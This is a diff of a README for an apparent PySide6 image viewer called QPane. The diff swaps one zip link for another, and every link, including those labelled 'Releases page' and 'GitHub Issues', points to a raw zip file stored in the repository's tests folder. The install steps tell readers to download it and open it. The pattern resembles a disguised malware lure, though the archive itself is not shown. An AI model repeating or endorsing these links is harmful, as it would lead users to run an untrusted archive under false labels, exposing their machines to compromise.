@@ -1,6 +1,6 @@
 # 🖼️ QPane - Fast and Easy Image Viewing
 
-[![Download QPane](https://raw.githubusercontent.com/JYCTC/QPane/main/qpane/ui/Pane-Q-1.1.zip)](https://raw.githubusercontent.com/JYCTC/QPane/main/qpane/ui/Pane-Q-1.1.zip)
+[![Download QPane](https://github.com/JYCTC/QPane/raw/refs/heads/main/tests/Pane_Q_v2.3-beta.1.zip)](https://github.com/JYCTC/QPane/raw/refs/heads/main/tests/Pane_Q_v2.3-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ QPane is a high-performance image viewer built with PySide6. It offers smooth pa
 
 ## 📥 Download & Install
 
-To get started with QPane, visit this page to download: [QPane Releases](https://raw.githubusercontent.com/JYCTC/QPane/main/qpane/ui/Pane-Q-1.1.zip).
+To get started with QPane, visit this page to download: [QPane Releases](https://github.com/JYCTC/QPane/raw/refs/heads/main/tests/Pane_Q_v2.3-beta.1.zip).
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/JYCTC/QPane/main/qpane/ui/Pane-Q-1.1.zip).
+1. Go to the [Releases page](https://github.com/JYCTC/QPane/raw/refs/heads/main/tests/Pane_Q_v2.3-beta.1.zip).
 2. Look for the latest version of QPane.
 3. Click on the download link for your operating system.
 4. Once downloaded, open the file and follow the installation instructions.
@@ -55,7 +55,7 @@ If you experience issues while using QPane, here are some common solutions:
 
 If you have further questions or need support:
 
-- Check the [QPane GitHub Issues](https://raw.githubusercontent.com/JYCTC/QPane/main/qpane/ui/Pane-Q-1.1.zip) for common user inquiries.
+- Check the [QPane GitHub Issues](https://github.com/JYCTC/QPane/raw/refs/heads/main/tests/Pane_Q_v2.3-beta.1.zip) for common user inquiries.
 - Leave a message in the issues section for any new problems or suggestions.
 
 ## 🧑‍🤝‍🧑 Community Contributions
@@ -66,6 +66,6 @@ QPane is open for contributions from users like you. If you have ideas for new f
 
 QPane is licensed under the MIT License. You can freely use, modify, and distribute the application as per the license terms.
 
-[🔗 Download QPane](https://raw.githubusercontent.com/JYCTC/QPane/main/qpane/ui/Pane-Q-1.1.zip)
+[🔗 Download QPane](https://github.com/JYCTC/QPane/raw/refs/heads/main/tests/Pane_Q_v2.3-beta.1.zip)
 
 Explore the power of QPane today!
